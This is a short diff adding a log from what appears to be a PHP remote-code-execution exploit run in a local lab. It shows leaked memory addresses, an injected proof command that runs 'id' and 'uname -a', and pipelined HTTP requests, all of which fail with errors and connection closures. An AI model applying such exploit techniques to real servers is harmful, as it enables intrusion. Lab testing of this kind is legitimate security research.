@@ -1,0 +1,12 @@
+A2=279369 B2=451384 S=0x7fe1bb4f8398 zif=0x7fe1bd54f370
+cmd='rm -f /out/ka; (id; uname -a) > /out/ka 2>&1' (44 bytes)
+proof before: /home/ravhi/randoman/deepjb/php2shell-lab/official-lab/multi-out/ka None
+=== pipelined A2+B2 on one connection ===
+resp1 status='HTTP/1.0 500 Internal Server Error' conn=b'close' clen=b'0' body=0
+resp2 read stopped: EOFError('closed before response headers')
+no fresh proof after pipeline (after=None)
+=== phase 2: B2 on a fresh connection (A2 child reuse) ===
+B2[1] failed: EOFError('closed before response headers')
+B2[2] failed: EOFError('closed before response headers')
+B2[3] failed: EOFError('closed before response headers')
+no fresh proof after B2 retries
